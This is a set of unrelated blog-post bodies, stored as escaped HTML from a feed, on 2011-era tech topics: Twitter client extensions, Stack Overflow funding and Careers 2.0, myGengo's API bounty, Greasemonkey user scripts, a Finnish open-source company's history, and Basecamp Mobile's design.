sharpen their tools.</p>\n<p><img src=\"http://almaer.com/blog/uploads/pinstripes.png\" alt=\"pinstripes\" title=\"pinstripes\" width=\"525\"></p>\n<p>Now, I get that the official Twitter client is a “base level experience”, but that doesn’t mean it has to be simplistic and rigid. I also find it hilarious that, although there isn’t an option to hide the Trendbar, there IS an option to turn pinstripes on and off :)</p>\n<p>You can easily go too far with “options” as Alex Faaborg (Firefox UX…. highly respected) mentions:</p>\n<p><a href=\"https://twitter.com/#!/faaborg/status/44278487674138624\"><img src=\"http://almaer.com/blog/uploads/Screen-shot-2011-03-07-at-Mar-7-@-12.48.24-AM.png\" alt=\"Screen shot 2011-03-07 at Mar 7 @ 12.48.24 AM\" title=\"Screen shot 2011-03-07 at Mar 7 @ 12.48.24 AM\" width=\"547\" height=\"212\"></a></p>\n<p>Now, I mentioned extensions above. This is another important thing to think about as a release valve for your users. Firefox took something that “had too many options” (Mozilla Suite) and stripped it to something much more bare bones, but XUL/XPCOM were still there (and even about:config was good in that extensions could target it). Developers could create fantastic additional experiences that users could enjoy. To me, this was one of the key items of Firefox that made it #winning in the old days. IE actually had add-ons too, but they were painful to write and the platform was nowhere near as approachable and available. We got amazing functionality such as Firebug and Greasemonkey. </p>\n<p>Ah, Greasemonkey! The Web turns out to be a fantastic extension platform. When I load up twitter.com itself, a few Greasemonkey scripts kick in for me to customize the experience, and I get things how <em>I</em> want them. You can mine for great user scripts out there, and now that browser such as Safari and Chrome also not only offer extension support, but do so in a very HTML (and Greasemonkey) friendly way, you will find them packaged there too. Chrome and Safari had to create extension systems to compete. How many of you waited for that one extension to full switch from Firefox to Chrome?</p>\n<p>In my ideal world, Twitter would not only add an option to get rid of the #dickbar, but would also offer an extension API that would enable folks to build extensions that flow from their awesome communication ESB in the cloud, all the way to the client platforms that access it.</p>\n<p>Our users are human and have different needs. It is fine and dandy to want to “do a Steve Jobs” and create something that is so perfect that you can hand it down to the fellows, but how about a one-two punch. A fantastic default experience, with hooks to enable developers to offer up fantastic experiences to your end users.</p>\n<p>I couldn’t move to Chrome without Adblock and ….</p>\n<p>I can’t move to Sparrow until Rapportive is supported.</p>\n<p>If you create a great plugin system, there will be no reason not to move on. #thewebrocksatthat #firstworldproblems</p>\n<div>\n<a href=\"http://feeds.feedburner.com/~ff/dion?a=f9EfMPW7hCs:hvUCQdANjYk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/dion?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/dion?a=f9EfMPW7hCs:hvUCQdANjYk:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/dion?d=dnMXMwOfBR0\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/dion?a=f9EfMPW7hCs:hvUCQdANjYk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/dion?i=f9EfMPW7hCs:hvUCQdANjYk:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/dion?a=f9EfMPW7hCs:hvUCQdANjYk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/dion?i=f9EfMPW7hCs:hvUCQdANjYk:V_sGLiPBpWU\" border=\"0\"></a>\n</div>"

When <a href=\"http://blog.stackoverflow.com/2010/05/announcing-our-series-a/\">we first raised venture capital</a> way back in the long-ago year of 2010, we actually had quite a few great investors interested in buying our stock. And since then, the buzz hasn’t abated. We were pretty sure that given the current market conditions, we could easily raise a big pile of new Unicorn-bucks without losing control of the company. <img style=\"float:right\" title=\"12 million unicorn bucks\" src=\"http://blog.stackoverflow.com/wp-content/uploads/12-million-unicorn-bucks.jpg\" alt=\"12 million unicorn bucks\" width=\"225\" height=\"298\"> We made a few phone calls, took a few meetings, I flew to London and Boston, and hey presto, we sold another $12 million worth of the company to some great investors.</p>\n<p>The new investors are <a href=\"http://www.indexventures.com/\">Index Ventures</a>, based in Geneva and London, and <a href=\"http://sparkcapital.com/\">Spark Capital</a>, based up in Boston. Our first investor, <a href=\"http://www.usv.com/\">Union Square Ventures</a>, will also put in more money so as to keep the same ownership percentage that they had before (this is called a “pro-rata”).</p>\n<p>Needless to say, the new investors will want to keep an eye on all that money, so Neil Rimer from Index will be joining the board of directors, and Bijan Sabet from Spark will be an observer on the board (he can come to meetings but he can’t vote). And to keep from tipping the board to the investors, the “common shareholders” (that is, the founders and employees) will be entitled to elect another representative of their own to the board. We picked <a href=\"http://dashes.com/anil/\">Anil Dash</a>, who has been blogging for even longer than I have and has been one of our most valuable advisors.</p>\n<p>Now, you may be wondering how we plan to spend all that money.

      "content" : "<p>\n\tAt the beginning of December I posted an <a href=\"http://mygengo.com/talk/blog/mygengo-unlocks-the-door-to-the-45000-api-lab\">article about our $45,000 API Lab</a> — an initiative to attract developers to tinker with our human translation API.  We provided a <a href=\"http://mygengo.com/services/api/lab#bounty-list\">list of over 40 software platforms</a> to integrate our API into, and gave developers an opportunity to win as much as $1,400 per working implementation.</p>\n<p>\n\tWe’re now just a month into the competition and “WOW!”, we couldn’t be happier with the response. In just one month, we’ve had loads of developers write in with comments and to let us know they’ve gotten started, and we currently have 2 working implementations submitted — one for Chrome and another for Safari.  Both were developed by Studio Hitori; “iGengo” can be found by <a href=\"https://chrome.google.com/webstore/detail/boljinabdgffmgffmibkbhncogjknnee\">visiting the Google Chrome store here</a>.</p>\n<p>\n\t<strong>Growing rewards total<br>\n\t</strong>When we opened the <a href=\"http://mygengo.com/services/api/lab\">API Lab</a>, one of our main goals was to create and maintain an open dialogue with the development community. We were open to suggestions for additions to the list of platforms, and if suggestions were approved, new platforms became eligible for a cash reward. Since the the lab’s opening we have added five platforms to the list and our total rewards pool has now grown to over <strong>$50,000</strong>!</p>\n<p>\n\tAmong the list of added platforms that particularly has us excited are the big three mobile platforms: iPhone, Android and Blackberry.</p>\n<p>\n\t<img alt=\"\" height=\"433\" src=\"http://mygengo-talk.s3.amazonaws.com/blog/Plugin_List_Update_2.png\" width=\"495\"></p>\n<p>\n\t<strong>Why so excited?<br>\n\t</strong>We’re excited with this kind of developer activity around our API because we see it as a step in providing a translation solution to an even larger audience than previously possible. We believe in simplicity and convenience, meaning customers should be able to order translations directly from where they are creating content. We’ve already seen Japanese tech bloggers translating their posts into English, and British merchants translating their product descriptions into multiple European languages via <a href=\"http://mygengo.com/translate\">Translate</a>.  With more plugins and platforms integrating our API, all types of users can easily request translations through a simple click from within their platform of choice, whether it be <a href=\"http://www.movabletype.org/\">MoveableType</a> or <a href=\"http://www.zen-cart.com/\">ZenCart</a>, and receive good-quality translations without ever visiting myGengo.com.</p>\n<p>\n\t<strong>I want in!<br>\n\t</strong>There’s still time to create a plugin and plenty of platforms eligible for cash rewards. For full details, check out the API Lab at <a href=\"http://mygengo.com/services/api\">http://mygengo.com/services/api </a></p>\n<p>\n\tThis is an open-ended bounty, with rewards given to the first developer to submit a working plugin for each platform.  If you send us something that works before January 15th, we’ll even give you a bonus!</p>\n<p>\n\tGood Luck!</p>\n\n<hr>\n<p>Categories:  <a href=\"http://mygengo.com/talk//blog/category/products/\">Products</a>, <a href=\"http://mygengo.com/talk//blog/category/api/\">API.</a>, <a href=\"http://mygengo.com/talk//blog/category/news/\">News</a>, <a href=\"http://mygengo.com/talk//blog/category/en/\">English</a>\n</p>\n<p>Tags: </p>\n<p><a href=\"http://api.tweetmeme.com/share?url=http://mygengo.com/talk/blog/api-lab-update\"><img src=\"http://api.tweetmeme.com/imagebutton.gif?url=http://mygengo.com/talk/blog/api-lab-update\" height=\"61\" width=\"51\"></a></p><img src=\"http://feeds.feedburner.com/~r/mygengo/blog/~4/Yh1zorXXGac\" height=\"1\" width=\"1\">"

In fact, you may remember that <a href=\"http://blog.stackoverflow.com/2008/10/expressing-your-tag-preferences/\">the favorite / ignored tags feature</a> now built into every site originally started life as <a href=\"http://userscripts.org/tags/stackoverflow\">a user script listed on userscripts.org</a> by Jonathan Buchanan aka <a href=\"http://stackoverflow.com/users/6760/insin\">insin</a>.</p>\n<p>We’re making user scripts a first class citizen on Stack Apps by …</p>\n<ul>\n<li>giving them their very own <b>script tab</b> on the homepage powered by the [script] tag.\n<li>updating the /faq and introductory messages to emphasize that browser scripts which enhance the Stack Exchange experience are welcome, even if they don’t technically use the API.\n<li>continuing to publicize the cool and useful scripts our community is creating from within our own community.</li></li></li></ul>\n<p>If you’re wondering how browser scripts work, the good news is that<br>\n<b>GreaseMonkey support is <i>almost</i> standard across most major browsers now.</b> We updated the <a href=\"http://stackapps.com/tags/script/info\">script tag wiki</a> to walk you through the process of installing user scripts in your browser. It’s easy — really!</p>\n<p>Take Ned Batchelder’s script on <a href=\"http://nedbatchelder.com/blog/201102/how_to_not_get_reputation_points_on_stack_overflow.html\">How to not get reputation points on Stack Overflow</a>, for example: </p>\n<blockquote><p><tt><span>// ==UserScript==</span><br><span>// @name           No answering on Stackoverflow</span><br><span>// @namespace      http://nedbatchelder.com/greasemonkey</span><br><span>// @description    Hide the answer box on Stack Overflow </span><br><span>//                 to stop obsessive behavior</span><br><span>// @include        http://stackoverflow.com/*</span><br><span>// ==/UserScript==</span></tt></p>\n<p><span>GM_addStyle</span><span>(</span><br>    <span>&quot;@namespace url(http://www.w3.org/1999/xhtml); &quot;</span> <span>+</span><br>    <span>&quot;.question-page #post-form { display: none; }&quot;</span><br>    <span>);</span><br></p></blockquote>\n<p>That’s a very, very simple browser user script which hides the question answer form on Stack Overflow.

      "content" : "<p>One day, you’ll be telling your grandchildren about getting a programming job, version 1.0. You would send a “resume” to a “recruiter.” It included all kinds of silly information required by the esoteric resume ritual (foreign languages spoken, whether or not you play ultimate Frisbee, Microsoft-veteran status). This so-called “information” was utterly useless at determining whether you could program or not, but if you spelled everything right and used suitable fonts, you could come in for a day of interviews at which you would be asked to perform mundane programming tasks on a whiteboard.</p>\n<p>Over here at Stack Overflow we feel a certain responsibility to make that process better for the millions of programmers who frequent our site. Our dev team in New York has been working day and night to rethink and rebuild our Careers section from the ground up, so today, we are excited to announce <a href=\"http://careers.stackoverflow.com/\">Careers 2.0</a>. Here are some of the biggest changes we’ve made.</p>\n<h2>1. It’s free (to job seekers)… but invite-only.</h2>\n<p>We used to charge job seekers $19 to post resumes. That was supposed to be a basic sanity filter, to make sure that everyone in our system was really looking for a job.</p>\n<p>You didn’t like that, and we had to agree. There are better filters than money. Starting today, posting a profile on Careers 2.0 is <strong>100% free</strong>, but you <strong>have to be invited</strong>.</p>\n<p>Invitations come from your peers. We’ll give members a few invites to distribute to programmers they know and trust. Or, contribute to Stack Overflow (and our other sites), get voted up by a lot of smart people, and you may get an automatic invite.</p>\n<p>By the way, if you paid in the past: thank you! Your account is free for life. But if you don’t think it was worth it, just email us for a full refund.</p>\n<h2>2. Profiles are much better</h2>\n<p>Our goal is that a Stack Overflow Careers profile should be <strong>the ultimate programmer’s portfolio</strong>. We’ve redesigned it to look great, and we’ve given you a clean public URL you can use as your professional home on the web (<a href=\"http://careers.stackoverflow.com/spolsky\">Here’s what mine looks like</a>). Most importantly, we now let you <strong>choose your favorite answers</strong> which will appear right in the portfolio. You can pick the answers which best demonstrate your expertise. (<a href=\"http://stackoverflow.com/questions/4342218/issues-with-ands-and-ors-cobol/4342263#4342263\">Here’s mine</a>. Don’t forget to vote it up!)</p>\n<p><a href=\"http://blog.stackoverflow.com/wp-content/uploads/Careers2Blog2.png\"><img title=\"Careers2Blog2\" src=\"http://blog.stackoverflow.com/wp-content/uploads/Careers2Blog2.png\" alt=\"\" width=\"400\" height=\"399\"></a></p>\n<h2>3. Support for passive candidates</h2>\n<p>Our goal is to help awesome programmers find great jobs. However, we’ve found that:</p>\n<ol>\n<li>People don’t always want to signal that they’re looking for a job</li>\n<li>A lot of candidates don’t even realize that there are better opportunities out there</li>\n<li>Creating a complete profile is a lot of work</li>\n</ol>\n<p>So, what we want is a way for people to be “passively” looking for a job—they’re willing to get an occasional offer from a company, even if they’re not actively looking for a job right now. And we want it to be frictionless, because if somebody is passively looking for a job then by definition they’re not going to do anything to seek it out.</p>\n<p><strong>Passive candidate search</strong> lets employers search people’s public profiles based on tags and location. For example, they could search for “Python” and “San Francisco” and find a few dozen users who have “San Francisco” as their location and have answered questions in the Python tag. They can view their <strong>public</strong> profile information, including their top answers. Remember, we’re never revealing anything which isn’t already part of your public profile.</p>\n<p>If they find a candidate they really like, the employer can <strong>request to contact them</strong>. We’ll notify that user in the Stack Exchange inbox that there’s an employer who is interested. That user can choose to receive the employer’s message, block that particular employer, or even block all employers. We’ll be watching this closely to see how it works and make sure it doesn’t become annoying or spammy, and we welcome your feedback on how best to serve passive candidates.</p>\n<h2>4. Much better search</h2>\n<p>Finally, we have completely <strong>revamped the way employers search</strong>. It’s much faster and cooler, and shows nifty statistics while you search, so, for example, when you say that you are looking for programmers in Chicago, you can instantly see charts breaking down the skills of Chicago programmers. Search for Ruby programmers, and you can see where they’re located on a map of the world.</p>\n<p><a href=\"http://blog.stackoverflow.com/wp-content/uploads/Careers2Blog.png\"><img title=\"Careers2Blog\" src=\"http://blog.stackoverflow.com/wp-content/uploads/Careers2Blog.png\" alt=\"\" width=\"400\" height=\"368\"></a></p>\n<p>You can <a href=\"http://careers.stackoverflow.com/employer/candidate-search\">test-drive the search interface for free</a>, and see some sample profiles along with basic information about how many candidates match your search.  Of course, to see the full results you’ll need to subscribe.</p>\n<h2>The future of jobs</h2>\n<p>In the future, automatic robot recruiters will use mental telepathy and nuclear fusion technology to get people the perfect jobs. When that happens, rest assured that those robots will be wearing Stack Overflow insignia, but until then, <a href=\"http://careers.stackoverflow.com/\">Careers 2.0</a> is a big leap ahead.</p>"

So instead we started our own business with <a href=\"http://fi.linkedin.com/in/henrihovi\">Henri Hovi</a> and <a href=\"http://haedong-kumdo.fi/valokuvat/photo/1dfb814a77df8fcb81411df9a2ac960de8aca43ca43/tag/all/jose/\">Johannes Hentunen</a>, with the idea that our Midgard expertise would be useful to a wider market.</p>\n<h2>The best laid plans</h2>\n<p>The initial plans were made at a Starbucks on New York's JFK airport while waiting for a flight to Atlanta, but their realisation had to wait until I finished my military service on the latter half of 2000. When I got rid of the bazookas and uniforms, we registered the company, wrote some business plans and started looking for seed money to get our business started. We were quite young then, and it was interesting to run around Helsinki talking to investors.</p>\n<p><img src=\"http://bergie.iki.fi/static/1/1e044345cc24cbc443411e0b06153d27d3672757275_bergie-presenting-2001.png\" border=\"0\" alt=\"bergie-presenting-2001.png\" title=\"bergie-presenting-2001.png\"></p>\n<p>How did these plans look like? Our initial idea was to get into the fashionable SaaS (or ASP, as it was known then) business by building collaboration tools on top of Midgard. The first product was a document store intended for the construction industry. With this system all plans and other documents related to a building project could be easily stored and accessed. This is <a href=\"http://replay.waybackmachine.org/20010709190334/http://www.nemein.com/corporate/nemein-info.pdf\">how we described ourselves</a>:</p>\n<blockquote>Nemein Solutions is the leading provider of Open Source Midgard software for mobile collaboration and information management.</blockquote>\n<p>But as plans go, this had to soon change due to the IT bubble being burst. To quote <a href=\"http://en.wikipedia.org/wiki/Helmuth_von_Moltke_the_Elder\">von Moltke</a>:</p>\n<blockquote>No plan of operations extends with certainty beyond the first encounter with the enemy's main strength</blockquote>\n<p>In spring 2001 IT bubble burst, and we suddenly found ourselves sitting in the office with all our projects being abruptly frozen. Around the same time our seed investor got embroiled in some large-scale customs lawsuit, and so not much help was to be expected from them. This meant we couldn't continue with our original plans, and instead had to start generating cash flow, quickly. Luckily Midgard was (and is!) a quite capable web framework, and so we had the option of going into the CMS business.</p>\n<h2>Nadmin Studio</h2>\n<p>Midgard's user interfaces back then were not very appealing, and so our first task was to go shopping for the CMS UI. There were two good options available: Nadmin Studio from Hong Kong Linux Center, a web based CMS and small business networking tool running on top of Midgard, and a Windows-based Midgard editing tool from DataFlow. As we were much more of a Linux shop, we went with Nadmin. It was quite a cool system, a customized Red Hat Linux install that set up not only Midgard and the web user interface, but also things like LDAP and IMAP servers talking directly with the Midgard database. And it had a quite nice WYSIWYG editor for people writing content on the web pages. We quickly became their reseller for Finland. Yes, back then you could get Midgard in a box (and <a href=\"http://www.flickr.com/photos/bergie/989581511/in/datetaken/\">even CD</a>):</p>\n<p><img src=\"http://bergie.iki.fi/static/1/1e04434e895096e443411e0935c736b84ef660a660a_nadminstudio-box-tux.png\" border=\"0\" alt=\"nadminstudio-box-tux.png\" title=\"nadminstudio-box-tux.png\"></p>\n<p>Having settled the tool question the next issue was finding clients. We took a list of hundred largest companies in Finland and basically called each of them, proposing a demo. We also approached several \"new media companies\" in order to see if they wanted a technical partner. Around these times our CEO <a href=\"http://fi.linkedin.com/pub/petri-kuusela/1/560/972\">Petri Kuusela</a> also figured that<em> we'd be a lot more convincing consultants in sweaters instead of Hugo Boss suits</em>, and so the look of the company changed.</p>\n<p>Through these efforts we were able to get some of our first and longest-term customers, including this one:</p>\n<blockquote>HELSINKI, Jun 12th 2001 -- Nemein Solutions helps Everscreen Mediateam, a Finnish multimedia company implement the Nemein.net Content Manager product to power Motiva's web services. Everscreen's and Nemein's cooperation provides Motiva with up-to-date and easy to use web sites.</blockquote>\n<p>Around this time we moved from the small four-desk office in central Helsinki to a much bigger place in Haukilahti, Espoo. My time was mostly spent motorcycling from one demo to another, as our two sales guys kept me so busy that on most days I didn't have time for a lunch break, and much less for actually writing code. The cash flow generated there helped to keep things running, but as usual, possibilities for product development suffered. This is called <a href=\"http://discuss.joelonsoftware.com/default.asp?joel.3.680507.33\">the Consulting Trap</a>:</p>\n<blockquote>...Once the consultancy money rolls in, it is hard to give up. Like an addiction.<br><br>I spent years thinking just six more months, then I'm going to quit and work on my µISV project.</blockquote>\n<h2>Nemein.Net</h2>\n<p>Consulting isn't such a bad business to be in. As long as the things you do produce value for customers it can be lucrative and interesting. But still the idea of having actual products was kept alive, and a bit later we built Nemein.Net, a project management tool for consulting companies. We changed the business model a bit, instead of providing hosted services we leased some industrial-grade servers to our clients with the software pre-installed. A cluster of engineering companies bought that, and as far as I know some of them still run it. <a href=\"http://lwn.net/Articles/2289/\">Datex-Ohmeda was another customer</a>, but they were later bought by General Electic.</p>\n<blockquote>&quot;For our project work it is very important to reduce management overhead and enable real-time tracking of project status. The Nemein.Net Projects suite provides a good match for these criteria,&quot; says Bror-Eric Granfelt, R&amp;D Manager at Datex-Ohmeda.</blockquote>\n<h2>Free Software company</h2>\n<p>In 2004 we <a href=\"http://bergie.iki.fi/blog/2004-04-15-002\">open sourced the Nemein.Net suite, now renamed to OpenPSA</a>. This was done as part of the 5th anniversary celebrations of the Midgard project. By this time Nadmin Studio had also been <a href=\"http://lwn.net/Articles/43891/\">GPLd and renamed to Aegir CMS</a>. So suddenly we were a pure Free Software company. We quickly started adopting MidCOM, the <a href=\"http://www.midgard-project.org/updates/2003-04-12-000/\">emerging MVC framework for Midgard and PHP</a>. MidCOM was produced initially by the German ISP <a href=\"http://www.link-m.de/\">Linksystem Muenchen</a>, but very soon Nemein was the primary contributor.</p>\n<p>The company structure changed, and we decided that instead of having a traditional office with desktop computers, it'd be better to be more location independent and work where our customers were. So we got a small office from the <a href=\"http://www.technopolis.fi/business_services/conference_and_video_meeting/espoo/innopoli_2\">Innopoli</a> business park mostly to facilitate <a href=\"http://nemein.com/en/people/rambo/\">Rambo</a>, and the rest of our people were moving around. Once a week we had a coordination lunch meeting in <a href=\"http://www.everestyeti.fi/en/index.php\">Restaurant Mount Everest</a> to keep the group spirit going. Some of that <a href=\"http://bergie.iki.fi/blog/staff_meeting_in_the_park/\">tradition has stayed</a>.</p>\n<p><img src=\"http://bergie.iki.fi/static/1/1df6fd5082c1aa46fd511df8eb03d0a5ffbbaa9baa9_20100604_009_small.jpg\" border=\"0\" alt=\"Staff meeting in a park\"></p>\n<p>Around this time we also started the switch on our workstations from HP's Linux laptops to MacBooks. This wasn't really a conscious strategy, but instead mandated by my laptop breaking a day or two before a <a href=\"http://www.flickr.com/photos/bergie/sets/72157604038349521/\">training trip to South Africa</a>. Back then <a href=\"http://www.linux-laptop.net/\">Linux on laptops</a> was still a quite cumbersome setup, and I needed a Unix machine where our software would run, quick. Later on I've returned to <a href=\"http://bergie.iki.fi/blog/on_innovation-and_how_choice_is_not_always_good/\">running Linux</a> on my own machines, but most of the company still works on OS X.</p>\n<p>The <a href=\"http://www.coss.fi/en\">Finnish Centre for Open Source Solutions</a> (COSS) was formed in 2003, and we soon joined up. A forming network of free software companies in Finland was good for both publicity and getting new projects. <a href=\"http://www.coss.fi/node/491\">OpenPSA gained a boost there</a>:</p>\n<blockquote>Collaboration with Nemein went well. Right from the beginning they were able to state their views clearly and backed by facts. We immediately understood how OpenPSA works, what customizations would be needed, and how much they would cost. Unfortunately we cannot say the same of all other solution providers, says doctor Ville Ojanen.</blockquote>\n<h2>Dreams of networked business</h2>\n<p>Another interesting opportunity that came from the COSS network was the EU-funded <a href=\"http://bergie.iki.fi/blog/first-look-at-digital-business-ecosystem/\">Digital Business Ecosystems project</a>. The project fit quite well in my view of the need for enabling cooperation between small companies in Europe, this time through having business systems talk to each other over a peer-to-peer network.</p>\n<p>To realise this dream we <a href=\"http://bergie.iki.fi/blog/how-openpsa-uses-dbe/\">connected our OpenPSA system into the ecosystem</a>, enabling companies to fluidly share tasks, workflows and hour reports over the network. Unfortunately not much came out of that. A bit later the maintenance of the OpenPSA project was <a href=\"http://bergie.iki.fi/blog/free_software_at_work-openpsa2_is_making_a_return/\">switched over to Content Control</a> from Germany.</p>\n<p>A later iteration of similar ideas was <a href=\"http://www.ajatus.info/\">Ajatus</a>, an experimental project to <a href=\"http://www.ajatus.info/documentation/ajatus_manifesto/\">build a \"personal CRM\"</a>.</p>\n<blockquote>\"Companies that don't realize their markets are now networked person-to-person, getting smarter as a result and deeply joined in conversation are missing their best opportunity.\" - The Cluetrain Manifesto, these 18.<br><br> Remember a time when you needed to share a document with a business partner, colleague or a customer? The CRM should make this easy without requiring complex IT integration setups or the disconnectivity of emailing files.</blockquote>\n<h2>Getting into position</h2>\n<p>Several Nemein people have been active <a href=\"http://routamc.org/\">motorcycle travelers</a>. As all our projects were more or less visible on the web, this brough the question of location sharing into the picture. For the <a href=\"http://www.deathmonkey.org/\">Death Monkey project in 2006</a> we built a set of location-aware features that enabled us to visualize the location of each participant on a map, and easily calculate distances to Gibraltar.</p>\n<p><img src=\"http://bergie.iki.fi/static/1/1e04438bb57f5ca443811e0b7f299cfb19e66486648_bergius-young-entrepreneur.png\" border=\"0\" alt=\"bergius-young-entrepreneur.png\" title=\"bergius-young-entrepreneur.png\"></p>\n<p>At that time using maps on the web was also growing, and so we stepped into the emerging business of neogeography. Over the years we've evangelized the usage of <a href=\"http://bergie.iki.fi/blog/making_the_gnome_desktop_location-aware/\">location information on Linux desktops</a>, built <a href=\"http://bergie.iki.fi/blog/halti-com_provides_contextual_product_recommendations/\">weather-aware clothes catalogues</a>, facilitated publishing open data of <a href=\"http://www.aalto.fi/fi/about/contact/\">campus maps</a> and made it easier to <a href=\"http://bergie.iki.fi/blog/buscatcher-never_miss_another_tram/\">catch a tram</a>. This is still one of the areas online that I find most interesting.</p>\n<h2>Growth and mobility</h2>\n<p>Over the years Nemein's business has been growing at a steady pace. Now we have a <a href=\"http://www.flickr.com/photos/bergie/4820279827/\">nice small office</a> in the Hietalahti area of Helsinki, and serve quite a bunch of interesting, <a href=\"http://nemein.com/en/clients/\">large Finnish customers</a> in the CMS space. A major milestone for the company was <a href=\"http://bergie.iki.fi/blog/aaa-important_milestone_for_nemein/\">achieving AAA credit rating</a> back in 2007:</p>\n<p><img src=\"http://bergie.iki.fi/midcom-serveattachmentguid-fb8877ca83af11dc816fcf3d3210e1eae1ea/nemein-aaa-bergie-joe-tm.jpg\" border=\"0\" alt=\"AAA rating\"></p>\n<p>Ignited by Apple's iPhone launch, the mobile ecosystem has been a very interesting area to operate in. To be part of it, we built the <a href=\"http://bergie.iki.fi/blog/maemo-s_community_involvement_infrastructure_is_what_meego_needs/\">community infrastructure for Maemo</a>, Nokia's emerging mobile Linux platform, and also got <a href=\"http://bergie.iki.fi/blog/me_on_meego/\">involved in the MeeGo</a> project. But now in the age of <a href=\"http://bethesignal.org/blog/2011/02/11/elopocalypse-nokia-chooses-microsoft/\">burning platforms</a> the future of that business is in question.</p>\n<h2>The Midgard way</h2>\n<p>The Midgard content repository and web framework have been a constant core part of our business for the whole history of the company. Everything we've built has been running on top of it. Has this been a wise choice? In the course of ten years, the web landscape has changed quite a bit. While Midgard itself has stayed current through constant development and refinement, hundreds and hundreds of competing systems have risen up, some of them becoming very popular compared to us. And yet we have stayed the course.</p>\n<p><img src=\"http://bergie.iki.fi/static/1/1e0443b57ae032c443b11e08df6cd11de31dab7dab7_midgard-team-in-suomenlinna.png\" border=\"0\" alt=\"midgard-team-in-suomenlinna.png\" title=\"midgard-team-in-suomenlinna.png\"></p>\n<p>Midgard, especially in the latest iterations, is an excellent tool for running information-rich systems. It has a very nice user interface and an elegant web development framework. These are tools that I feel have lots of possibilities still ahead of them. Some of the design decisions done in the early days of the project, like integrated support for multi-site hosting, and for multilingual content, are things that now power some of our most important customer deployments</p>\n<p>But at the same time I've learned that especially for smaller open source projects like us, the monolithic \"all or nothing\" approach is not very healthy. Frameworks keep us apart, while libraries allow us to share our code and experiences. This is resulting to collaboration with other projects on many levels, from a <a href=\"http://bergie.iki.fi/blog/php-finally_getting_an_ecosystem/\">shared PHP ecosystem</a> managed through the Apache Software Foundation, to common tools for <a href=\"http://bergie.iki.fi/blog/decoupling_content_management/\">decoupling the Content Management experience</a>. <a href=\"http://www.iks-project.eu/\">Linked Data</a> also plays a large role here.</p>\n<h2>To wrap it up</h2>\n<p>Ten years as an entrepreneur is a long path. Financially it may not have been as rewarding as we initially thought it would be, but experience-wise it has been astonishing. I've been part of building many challenging business-critical systems, learnt a lot of things, and given talks in dozens of conferences all around the world. It is hard to see as varied and interesting possibilities in regular employment.</p>\n<p>Thanks to the whole <a href=\"http://nemein.com/en/people/\">current Nemein team</a>, and the people who've been here before for all the awesome work done over these years. You rock!</p>"

(I didn't actually do much of this kind of self-expression, but I thought that perhaps I should.)</p>\n\n<p>Now I choose clothes that I like and that are appropriate. I don’t worry about whether they’re “me.” I want our apartment to be comfortable, attractive, and high-functioning. I don’t worry about whether it expresses “my unique style.” I stopped thinking much about my tastes, because it wasn’t a question that captured my interest. </p>\n\n<p>I finally realized that all I do, all day long, is express myself, in the way that does interest me – through writing. And that was enough. I didn’t have to worry about the look of my shoes or my curtains if I didn’t want to. This sounds like a simple thing, but it was a huge relief.</p>\n\n<p>I know so many people who find great pleasure in making careful choices -- who really know what they like, and enjoy taking the time to search out things they love. But it’s a <a href=\"http://www.happiness-project.com/happiness_project/2007/04/the_importance_.html\">Secret of Adulthood</a>: Just because something is fun for <em>someone else</em> doesn’t mean it’s fun for <em>me </em>-- and vice versa. </p>\n\n<p>I don’t want to think too much about making authentic choices about things I don’t authentically care about. Life is too short. In fact, social psychologist Roy Baumeister suggests, we pay a price for seeking to be “authentic.” In a world so full of choices, choosing actively and deliberately among alternatives demands considerable mental energy that then can’t be used for other tasks. </p>\n\n<p>Here’s the strange thing: at the same time that I decided to let go of the idea of “expressing my personal style,” I was also thinking a lot about my personal  commandment to <a href=\"http://www.happiness-project.com/happiness_project/2008/10/paradoxes-of-ha.html\">Be Gretchen</a>. In my mind, these similar-sounding ideas were actually very different. But ironically, perhaps, now that I’ve spent a lot of time trying to “Be Gretchen,” I have a much better idea of my personal style. </p>\n\n<p>I’m still not much interested in doing the work it would take to have my tastes reflected in my stuff, but I do have a much better sense of what my tastes <em>are</em>. For instance, lately I've been reading about Louis Comfort Tiffany's masterpiece, <a href=\"http://www.amazon.com/gp/product/0300117876?ie=UTF8&amp;tag=thehappproj-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=0300117876\">Laurelton Hall</a> (destroyed by a fire, such a loss). That, I know I love.</p>\n\n<p>Do you have a personal style? Does expressing it cause you pleasure, or annoyance -- or do you not worry about this question at all?</p>\n\n<p>* I had fun doing this <a href=\"http://www.cbsnews.com/8301-500803_162-20031710-500803.html\">interview</a> with Jim Axelrod of CBS News about...yes, you guessed it...happiness.</p>\n\n<p><em>* Want to get my free monthly newsletter?

    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>Feedback is an essential part of software user interface design. It’s especially true when designing applications for current mobile devices. Tapping a touch screen is less precise than clicking with a mouse. Touch screens also lack the tactile and auditory feedback of a physical key or button. Slow, unreliable cellular data access adds to the confusion. A user might wonder: Is the app broken or do I have a poor connection? Was my tap registered or did my fingers miss that tiny button? Making sure users get clear feedback in response to their actions and to changes in state or conditions is key to a great software experience.</p>\n\n\n\t<p>When we designed <a href=\"http://basecamphq.com/mobile\">Basecamp Mobile</a> we decided to use a variety of methods to keep people informed about the current state of the app. Different conditions can require different feedback, so we had to carefully consider multiple types of feedback. Here are some examples:</p>\n\n\n\t<h2>Touch</h2>\n\n\n\t<p>It was important for us to make taps in the app feel responsive. Even if there could be a delay before the associated action executed it was essential that the user knew the tap was successful. Anything that can be tapped in Basecamp Mobile has a selected state that highlights the item immediately when the user touches the screen. Here you can see how a selected item on the project screen:</p>\n\n\n\t<p><img src=\"http://s3.amazonaws.com/37assets/svn/556-post_projects_touched.png\" alt=\"Touched state\"></p>\n\n\n\t<h2>Loading states</h2>\n\n\n\t<p>Basecamp Mobile is an <span>HTML5</span> app that uses local storage to cache both content and the app itself. The app runs entirely in the browser, rendering <span>HTML</span> with Javascript and loading only your account content from the server when needed. Each screen has a number of states depending on the status of the screen’s content. A single loading indicator wouldn’t cut it—the feedback had to be appropriate to each situation. Here are some of the states we had to consider in the design:</p>\n\n\n\t<h3>Initial 